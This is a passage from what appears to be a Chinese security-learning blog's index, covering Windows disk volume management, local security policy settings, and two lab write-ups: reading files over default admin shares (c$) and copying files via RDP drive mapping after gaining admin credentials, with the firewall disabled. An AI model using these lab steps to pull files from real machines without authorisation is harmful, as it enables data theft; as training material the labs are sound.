src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建简单卷向导界面.png" alt="新建简单卷向导界面"></center></li><li><p>点击【下一步】按钮进入卷大小设置界面，此处将卷大小设置为100M，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/指定简单卷大小.png" alt="指定简单卷大小"></center></li><li><p>点击【下一步】按钮，进入盘符分配界面，此处采用默认设置即可，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/为新建简单卷设置盘符.png" alt="为新建简单卷设置盘符"></center></li><li><p>点击【下一步】按钮进入分区格式化设置界面，在此界面中需要设置文件系统格式、卷标名称、是否执行快速格式化操作等信息，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷格式化设置.png" alt="简单卷格式化设置"></center></li><li><p>点击【下一步】按钮后进入设置检查界面，在此界面中可以核对之前对分区的设置信息，界面显示如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷设置信息核对.png" alt="简单卷设置信息核对"></center></li><li><p>单击【完成】按钮后，磁盘1中出现刚刚设置的新加卷F，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新加卷成功.png" alt="新加卷成功"></center></li></ol><h4 id="扩展简单卷"><a href="#扩展简单卷" class="headerlink" title="扩展简单卷"></a>扩展简单卷</h4><ol><li><p>在想要扩展的简单卷上右键点击【扩展卷…】选项后打开扩展卷向导，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷扩展向导.png" alt="简单卷扩展向导"></center></li><li><p>单击【下一步】按钮后将磁盘2和磁盘3各划分出100M来扩展简单卷，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷扩展容量设置.png" alt="简单卷扩展容量设置"></center></li><li><p>单击【下一步】按钮后将显示设置核对界面，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷扩展核对.png" alt="简单卷扩展核对"></center></li><li><p>点击【完成】按钮后扩展后的简单卷如下图所示。（简单卷 → 跨区卷）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷跨区扩展.png" alt="简单卷跨区扩展"></center></li></ol><h4 id="压缩简单卷"><a href="#压缩简单卷" class="headerlink" title="压缩简单卷"></a>压缩简单卷</h4><ol><li><p>在想要压缩的简单卷上右键选择【压缩卷…】选项后显示压缩设置界面，此处采用默认设置以压缩出足够大的空间使得操作前后的结果形成明显对比。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷压缩设置界面.png" alt="简单卷压缩设置界面"></center></li><li><p>单击【压缩】按钮后，新加卷F被压缩至84M，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷压缩结果.png" alt="简单卷压缩结果"></center></li></ol><h4 id="为简单卷添加镜像"><a href="#为简单卷添加镜像" class="headerlink" title="为简单卷添加镜像"></a>为简单卷添加镜像</h4><ol><li><p>选中想要添加镜像的简单卷右键选择【添加镜像】选项，打开添加镜像设置界面，这里选择磁盘2作为简单卷的镜像，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷添加镜像设置界面.png" alt="简单卷添加镜像设置界面"></center></li><li><p>点击【添加镜像】按钮后，磁盘2中将划分出84M作为新加卷F的镜像，操作结果如下图所示。（简单卷 → 镜像卷）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷添加镜像结果.png" alt="简单卷添加镜像结果"></center></li></ol><h4 id="删除简单卷"><a href="#删除简单卷" class="headerlink" title="删除简单卷"></a>删除简单卷</h4><ol><li><p>选项想要删除的简单卷右键选择【删除卷..】选项，在提示界面中单击【是】按钮后即可将简单卷删除。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷删除.png" alt="简单卷删除"></center></li><li><p>简单卷删除后会变成未分配分区，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/简单卷删除结果.png" alt="简单卷删除结果"></center></li></ol><h3 id="跨区卷管理"><a href="#跨区卷管理" class="headerlink" title="跨区卷管理"></a>跨区卷管理</h3><h4 id="新建跨区卷"><a href="#新建跨区卷" class="headerlink" title="新建跨区卷"></a>新建跨区卷</h4><ol><li><p>选中磁盘右键选择【新建跨区卷..】选项，打开新建跨区卷向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建跨区卷向导.png" alt="新建跨区卷向导"></center></li><li><p>单击【下一步】按钮进入磁盘与容量设置界面，此处将从磁盘1、磁盘2、磁盘3中分别划分出100M、200M、300M用来组建跨区卷。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/设置跨区卷容量.png" alt="设置跨区卷容量"></center></li><li><p>单击【下一步】按钮进入驱动器号设置界面，此处采用默认设置，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/跨区卷驱动器号设置.png" alt="跨区卷驱动器号设置"></center></li><li><p>单击【下一步】按钮进入卷区格式化设置界面，此处采用默认的NTFS文件系统等，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/跨区卷格式化设置.png" alt="跨区卷格式化设置"></center></li><li><p>单击【下一步】将显示跨区卷设置核对信息，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建跨区卷信息核对.png" alt="新建跨区卷信息核对"></center></li><li><p>单击【完成】按钮后创建的新加卷E结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建跨区卷结果.png" alt="新建跨区卷结果"></center></li></ol><h4 id="扩展跨区卷"><a href="#扩展跨区卷" class="headerlink" title="扩展跨区卷"></a>扩展跨区卷</h4><ol><li><p>选中需要设置扩展的跨区卷右键选择【扩展卷…】选项进入跨区卷扩展向导界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/跨区卷扩展向导.png" alt="跨区卷扩展向导"></center></li><li><p>单击【下一步】按钮进入设置磁盘和容量界面，这里将磁盘1中划分100M到跨站卷中，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/跨区卷扩展容量设置.png" alt="跨区卷扩展容量设置"></center></li><li><p>单击【下一步】按钮显示扩展卷设置信息，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/扩展跨区卷信息核对.png" alt="扩展跨区卷信息核对"></center></li><li><p>单击【完成】按钮，跨区卷扩展结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/跨区卷扩展结果.png" alt="跨区卷扩展结果"></center></li></ol><h4 id="压缩跨区卷"><a href="#压缩跨区卷" class="headerlink" title="压缩跨区卷"></a>压缩跨区卷</h4><ol><li><p>选中想要压缩的跨区卷右键选择【压缩卷…】选项，显示压缩设置界面，这里采用默认设置以最大容量压缩空间使操作前后结果形成鲜明对比。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/跨区卷 压缩设置.png" alt="跨区卷 压缩设置"></center></li><li><p>单击【压缩】按钮后扩展卷压缩结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/跨区卷压缩结果.png" alt="跨区卷压缩结果"></center></li></ol><h4 id="删除跨区卷"><a href="#删除跨区卷" class="headerlink" title="删除跨区卷"></a>删除跨区卷</h4><ol><li><p>选中想要删除的跨区卷，右键选择【删除卷…】选项，在提示界面中单击【是】按钮即可删除跨区卷，操作结果如下图所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/删除跨区卷.png" alt="删除跨区卷"></center></li><li><p>删除跨区卷结果。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/删除跨区卷结果.png" alt="删除跨区卷结果"></center></li></ol><h3 id="带区卷管理"><a href="#带区卷管理" class="headerlink" title="带区卷管理"></a>带区卷管理</h3><h4 id="创建带区卷"><a href="#创建带区卷" class="headerlink" title="创建带区卷"></a>创建带区卷</h4><ol><li><p>选中磁盘右键选择【新建带区卷..】选项，显示新建带区卷向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建带区卷向导.png" alt="新建带区卷向导"></center></li><li><p>单击【下一步】进入磁盘与容量设置界面，这里设置磁盘1和磁盘2各100M，操作结果如下图所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/带区卷容量设置.png" alt="带区卷容量设置"></center></li><li><p>单击【下一步】进入驱动器号设置界面，采用默认设置即可，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/带区卷盘符设置.png" alt="带区卷盘符设置"></center></li><li><p>单击【下一步】按钮进入卷区格式化界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/带区卷格式化设置.png" alt="带区卷格式化设置"></center></li><li><p>单击【下一步】按钮显示新建带区卷设置核对信息，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/带区卷配置核对.png" alt="带区卷配置核对"></center></li><li><p>点击【完成】按钮，新建带区卷结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/带区卷新建结果.png" alt="带区卷新建结果"></center></li></ol><h4 id="删除带区卷"><a href="#删除带区卷" class="headerlink" title="删除带区卷"></a>删除带区卷</h4><ol><li><p>选项想要删除的带区卷右键选择【删除卷..]选项，在提示界面中单击【是】按钮，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/删除带区卷.png" alt="删除带区卷"></center></li><li><p>带区卷删除结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/带区卷删除结果.png" alt="带区卷删除结果"></center></li></ol><h3 id="镜像卷管理"><a href="#镜像卷管理" class="headerlink" title="镜像卷管理"></a>镜像卷管理</h3><h4 id="新建镜像卷"><a href="#新建镜像卷" class="headerlink" title="新建镜像卷"></a>新建镜像卷</h4><ol><li><p>选中磁盘右键选择【新建镜像卷…】选项，显示新建镜像卷向导如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建镜像卷向导.png" alt="新建镜像卷向导"></center></li><li><p>单击【下一步】按钮进入磁盘和容量设置界面，这里设置磁盘1和磁盘2各100M操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷容量设置.png" alt="镜像卷容量设置"></center></li><li><p>单击【下一步】按钮进入盘符设置界面，操作默认设置如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷盘符设置.png" alt="镜像卷盘符设置"></center></li><li><p>单击【下一步】按钮进入卷区格式化界面，操作默认设置界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷格式化设置.png" alt="镜像卷格式化设置"></center></li><li><p>单击【下一步】按钮显示镜像卷设置核对信息，显示结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷设置核对.png" alt="镜像卷设置核对"></center></li><li><p>单击【完成】按钮，新建镜像卷操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建镜像卷结果.png" alt="新建镜像卷结果"></center></li></ol><h4 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h4><ol><li><p>选中想要删除镜像的镜像卷右键选择【删除镜像】选项，在删除镜像界面选中想要删除镜像的磁盘，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/删除镜像.png" alt="删除镜像"></center></li><li><p>点击【删除镜像】按钮并确定删除后，磁盘1中的镜像分区将被删除，操作结果如下图所示。（镜像卷 → 简单卷）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷变简单卷.png" alt="镜像卷变简单卷"></center></li></ol><h4 id="中断镜像"><a href="#中断镜像" class="headerlink" title="中断镜像"></a>中断镜像</h4><ol><li><p>选中想要中断镜像的镜像卷右键选择【中断镜像卷】选项，在提示信息中单击【是】按钮，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷中断镜像.png" alt="镜像卷中断镜像"></center></li><li><p>中断镜像卷结果，镜像卷变成两个简单卷，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷中断操作结果.png" alt="镜像卷中断操作结果"></center></li></ol><h4 id="删除镜像卷"><a href="#删除镜像卷" class="headerlink" title="删除镜像卷"></a>删除镜像卷</h4><ol><li><p>选中想要删除卷的镜像卷右键选择【删除卷…】选项，在提示界面中单击【是】按钮操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷删除.png" alt="镜像卷删除"></center></li><li><p>镜像卷删除结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/镜像卷删除结果.png" alt="镜像卷删除结果"></center></li></ol><h3 id="RAID-5管理"><a href="#RAID-5管理" class="headerlink" title="RAID-5管理"></a>RAID-5管理</h3><h4 id="新建RAID-5"><a href="#新建RAID-5" class="headerlink" title="新建RAID-5"></a>新建RAID-5</h4><ol><li><p>选中磁盘右键选择【新建RAID-5卷…】选项，打开新建RAID-5卷向导界面，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/新建RAID-5卷向导.png" alt="新建RAID-5卷向导"></center></li><li><p>单击【下一步】按钮进入磁盘和容量设置界面，此处设置在磁盘1、磁盘2、磁盘3中各划分100M，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/RAID-5设置磁盘容量.png" alt="RAID-5设置磁盘容量"></center></li><li><p>单击【下一步】按钮，设置盘符操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/RAID-5盘符设置.png" alt="RAID-5盘符设置"></center></li><li><p>单击【下一步】按钮，设置格式化操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/RAID-5格式化.png" alt="RAID-5格式化"></center></li><li><p>单击【下一步】按钮，显示RAID-5设置核对信息，显示界面如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/RAID-5核对信息.png" alt="RAID-5核对信息"></center></li><li><p>单击【完成】设置的RAID-5卷如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/RAID-5设置结果.png" alt="RAID-5设置结果"></center></li></ol><h4 id="删除RAID-5卷"><a href="#删除RAID-5卷" class="headerlink" title="删除RAID-5卷"></a>删除RAID-5卷</h4><ol><li><p>选中想要删除的RAID-5卷右键选择【删除卷…】选项，在提示界面单击【是】按钮，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/删除RAID-5.png" alt="删除RAID-5"></center></li><li><p>删除RAID-5卷结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/删除RAID-5卷结果.png" alt="删除RAID-5卷结果"></center></li></ol><h4 id="修复RAID-5卷"><a href="#修复RAID-5卷" class="headerlink" title="修复RAID-5卷"></a>修复RAID-5卷</h4><p>​        三个盘模拟RAID-5卷，脱机其中一个磁盘，将数据修复到新磁盘中。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DiskManagement/RAID-5修复卷.gif" alt="RAID-5修复卷"></center><ul><li>一块硬盘损坏后系统会虚拟出一块磁盘以保证RAID-5中数据可读。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 磁盘管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows本地安全策略</title>
      <link href="/2020/11/06/windows-ben-di-an-quan-ce-lue/"/>
      <url>/2020/11/06/windows-ben-di-an-quan-ce-lue/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-本地安全策略概述"><a href="#0x01-本地安全策略概述" class="headerlink" title="0x01 本地安全策略概述"></a>0x01 本地安全策略概述</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>​        通过设置一系列的<strong>规则</strong>，影响当前计算机的安全设置，用户登录后会受<strong>安全策略</strong>的控制，从而保证本地计算机的安全。</p><h2 id="打开本地安全策略管理控制台"><a href="#打开本地安全策略管理控制台" class="headerlink" title="打开本地安全策略管理控制台"></a>打开本地安全策略管理控制台</h2><ol><li><p>图形界面</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/secpol/图形化打开本地安全策略管理器.gif" alt="图形化打开本地安全策略管理器"></center></li><li><p>命令界面</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/secpol/命令打开本地安全策略管理器.gif" alt="命令打开本地安全策略管理器"></center></li></ol><h1 id="0x02-账户策略"><a href="#0x02-账户策略" class="headerlink" title="0x02 账户策略"></a>0x02 账户策略</h1><p>​        账户策略通过设置密码策略和账户锁定策略来提高用户的密码安全级别。账户策略主要包含<strong>密码策略</strong>和<strong>账户锁定策略</strong>。</p><h2 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h2><h3 id="1-密码必须符合复杂性要求"><a href="#1-密码必须符合复杂性要求" class="headerlink" title="1. 密码必须符合复杂性要求"></a>1. 密码必须符合复杂性要求</h3><ul><li><strong>已启用</strong>：新建用户密码复杂性必须满足要求（包含4类字符中的三种 大写、小写、数字、特殊符号）</li><li><strong>已禁用</strong>：对密码复杂性没有要求</li></ul><h3 id="2-密码长度最小值"><a href="#2-密码长度最小值" class="headerlink" title="2. 密码长度最小值"></a>2. 密码长度最小值</h3><ul><li>取值范围：<code>0-14</code></li><li><code>0</code>：代表可不设置密码</li></ul><h3 id="3-密码最短使用期限"><a href="#3-密码最短使用期限" class="headerlink" title="3. 密码最短使用期限"></a>3. 密码最短使用期限</h3><ul><li>取值范围：<code>0-998</code></li><li><code>0</code>：代表可所示更改密码</li></ul><h3 id="4-密码最长使用期限"><a href="#4-密码最长使用期限" class="headerlink" title="4. 密码最长使用期限"></a>4. 密码最长使用期限</h3><ul><li>取值范围：<code>0-999</code></li><li><code>0</code>：代表密码永不过期</li><li>默认为<code>42</code>天</li></ul><h3 id="5-强制密码历史"><a href="#5-强制密码历史" class="headerlink" title="5. 强制密码历史"></a>5. 强制密码历史</h3><ul><li>取值范围：<code>0-24</code></li><li><code>0</code>：代表可随意使用过去使用的密码</li></ul><h3 id="6-用可还原的加密来存储密码"><a href="#6-用可还原的加密来存储密码" class="headerlink" title="6. 用可还原的加密来存储密码"></a>6. 用可还原的加密来存储密码</h3><ul><li>已禁用：不在网上存储密码</li><li>已启用：在网上存储密码</li></ul><h2 id="账户锁定策略"><a href="#账户锁定策略" class="headerlink" title="账户锁定策略"></a>账户锁定策略</h2><h3 id="1-账户锁定时间"><a href="#1-账户锁定时间" class="headerlink" title="1. 账户锁定时间"></a>1. 账户锁定时间</h3><ul><li>代表该账户被锁定后，多长时间自动解锁</li><li>范围<code>0~99999</code>分钟</li><li>设置为代表永远被锁定，只能由管理员手动解锁</li><li><font color="red">对管理员无效</font></li></ul><h3 id="2-账户锁定阈值"><a href="#2-账户锁定阈值" class="headerlink" title="2. 账户锁定阈值"></a>2. 账户锁定阈值</h3><ul><li>代表用户连续输错 密码次数等于阈值后该账户被锁定</li><li>范围<code>0~999</code></li><li>设置为<code>0</code>代表该账户永不锁定</li></ul><h3 id="3-重置账户锁定计数器"><a href="#3-重置账户锁定计数器" class="headerlink" title="3. 重置账户锁定计数器"></a>3. 重置账户锁定计数器</h3><ul><li>用户在该计数器时间内只要输错次数不到锁定阈值，该账户不被锁定，过此时间后又有相同的输错次数</li><li>设置范围小于或等于<strong>账户锁定时间</strong></li></ul><h1 id="0x03-本地策略"><a href="#0x03-本地策略" class="headerlink" title="0x03 本地策略"></a>0x03 本地策略</h1><p>​        本地策略包含审核策略、用户权限分配、安全选项三类。</p><h2 id="审核策略"><a href="#审核策略" class="headerlink" title="审核策略"></a>审核策略</h2><p>​        审核策略主要为指定操作是记录成功操作还是记录失败操作亦或是都记录。</p><ul><li>审核策略更改</li><li>审核登录事件</li><li>审核对象访问</li><li>审核进程跟踪</li><li>审核目录服务访问</li><li>审核特权使用</li><li>审核系统事件</li><li>神格账户登录事件</li><li>审核账户管理</li></ul><h2 id="用户权限分配"><a href="#用户权限分配" class="headerlink" title="用户权限分配"></a>用户权限分配</h2><p>​        用户权限分配模块主要是通过将用户、组添加到指定的策略中来实现用户权限分配。</p><p><strong>常用策略</strong>：</p><ul><li>更改系统时间</li><li>关闭系统</li><li>拒绝本地登录</li><li>拒绝从网络访问这台计算机</li><li>拒绝通过远程桌面服务登录</li><li>允许本地登录</li><li>允许通过远程桌面服务登录</li></ul><h2 id="安全选项"><a href="#安全选项" class="headerlink" title="安全选项"></a>安全选项</h2><p>​        控制一些和操作系统安全相关的设置</p><p><strong>常用选项</strong>：</p><ul><li>交互式登录：登陆时不显示用户名</li><li>交互式登录：试图登陆的用户的<strong>消息标题</strong></li><li>交互式登录：试图登陆的用户的<strong>消息文本</strong></li><li>交互式登录：无须按 Ctrl+Alt+Del</li><li>网络访问：本地账户的共享和安全模型<ul><li>经典-对本地用户进行身份验证，不改变其本来身份</li><li>仅来宾-对本地用户进行身份验证，其身份为来宾</li></ul></li><li>账户：使用空白密码的账户只允许控制台登陆<ul><li>默认已开启</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 安全策略 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>访问Windows系统默认的共享磁盘</title>
      <link href="/2020/11/06/fang-wen-windows-xi-tong-mo-ren-de-gong-xiang-ci-pan/"/>
      <url>/2020/11/06/fang-wen-windows-xi-tong-mo-ren-de-gong-xiang-ci-pan/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-情景简述"><a href="#0x01-情景简述" class="headerlink" title="0x01 情景简述"></a>0x01 情景简述</h1><p>​        某服务器未关闭Windows系统默认共享的磁盘，且未对网络访问用户进行策略限制。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>系统：<code>Windows Server 2008 R2 * 2</code></li></ul><h1 id="0x03-实验过程"><a href="#0x03-实验过程" class="headerlink" title="0x03 实验过程"></a>0x03 实验过程</h1><ol><li><p>在【运行框】中输入<code>\\10.10.10.155\c$</code>后点击【确认】按钮尝试使用当前登录账户尝试登录。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DefaultSharedDisk/访问共享磁盘.png" alt="访问共享磁盘"></center></li><li><p>输入正确的管理员和密码后即可访问共享的磁盘文件，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DefaultSharedDisk/共享磁盘中的文件.png" alt="共享磁盘中的文件"></center></li><li><p>文件操作权限。将共享磁盘中的文件夹拷贝到攻击机上。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Software/Win/DefaultSharedDisk/复制文件夹.png" alt="复制文件夹"></center><p>说明：</p><ul><li>登录的用户拥有的权限高低将限制对共享磁盘的操作权限。</li></ul></li></ol><h1 id="0x04-实验分析"><a href="#0x04-实验分析" class="headerlink" title="0x04 实验分析"></a>0x04 实验分析</h1><ul><li>WIndows系统默认的共享磁盘存在很高的危险性，如泄露管理员账户信息或通过其他方式得到管理员权限后靶机上的文件将完全沦陷。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 磁盘共享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>组合拳之远程桌面加磁盘映射实现文件拷贝</title>
      <link href="/2020/11/06/zu-he-quan-zhi-yuan-cheng-zhuo-mian-jia-ci-pan-ying-she-shi-xian-wen-jian-kao-bei/"/>
      <url>/2020/11/06/zu-he-quan-zhi-yuan-cheng-zhuo-mian-jia-ci-pan-ying-she-shi-xian-wen-jian-kao-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-情景简述"><a href="#0x01-情景简述" class="headerlink" title="0x01 情景简述"></a>0x01 情景简述</h1><p>​        在Windows系统中使用远程桌面程序时可以将自己的硬盘映射到被远程的主机上，实现文件快速拷贝。</p><h1 id="0x02-实验环境"><a href="#0x02-实验环境" class="headerlink" title="0x02 实验环境"></a>0x02 实验环境</h1><ul><li>系统：两个<code>Windows Server 2008 R2</code></li><li>软件：<code>mstsc</code></li></ul><h1 id="0x03-实验条件"><a href="#0x03-实验条件" class="headerlink" title="0x03 实验条件"></a>0x03 实验条件</h1><ul><li>拥有一个管理员账户</li><li>靶机开启远程登录服务</li></ul><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>靶机开启远程桌面服务。计算机属性 → 【高级系统设置】 → 勾选【身份认证】 → 点击【选择用户】按钮 → 添加用户。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/开启远程桌面服务.png" alt="开启远程桌面服务"></center></li><li><p>关闭防火墙。【运行框】 → <code>firewall.cpl</code> → 关闭防火墙。（<font color="DoderBlue">在2008中防火墙的默认规则会过滤远程桌面访问时的端口，为方便实验此处直接禁掉防火墙，但是在正常使用远程桌面服务时这样操作会大大降低系统的安全性，这里推荐参考<a href="https://z1r0s.github.io/2020/08/26/win10-yuan-cheng-zhuo-mian-ji-fang-huo-qiang-pei-zhi/">Win10远程桌面及防火墙配置</a>在较安全的前提下开启远程访问。</font>）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/关闭防火墙.png" alt="关闭防火墙"></center></li><li><p>远程桌面设置对磁盘的映射。【运行框】 → <code>mstsc</code>  → 选择【本地资源】选项卡 → 点击【详细信息】按钮 → 勾选【本地磁盘】。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/远程桌面设置对磁盘的映射.png" alt="远程桌面设置对磁盘的映射"></center></li><li><p>远程桌面登录。输入用户名和密码进行远程桌面登录。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/远程桌面邓丽.png" alt="远程桌面登录"></center></li><li><p>稍等一会后，使用<code>administrator</code>账户登录成功后在资源管理器中显示本地映射的磁盘文件。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/本地磁盘映射成功.png" alt="本地磁盘映射成功"></center></li><li><p>成功拷贝文件。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/Combination/mstsc_DiskMap/拷贝文件成功.png" alt="拷贝文件成功"></center></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li>存在限制条件：<ul><li>拥有管理员权限</li><li>靶机开启远程桌面</li></ul></li><li>渗透利用：<ul><li>拿到管理员权限后，远程桌面拷贝敏感文件到本地文件夹</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 组合拳 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程桌面 </tag>
            
            <tag> 文件拷贝 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows文件系统</title>
      <link href="/2020/11/06/windows-wen-jian-xi-tong/"/>
      <url>/2020/11/06/windows-wen-jian-xi-tong/</url>
      
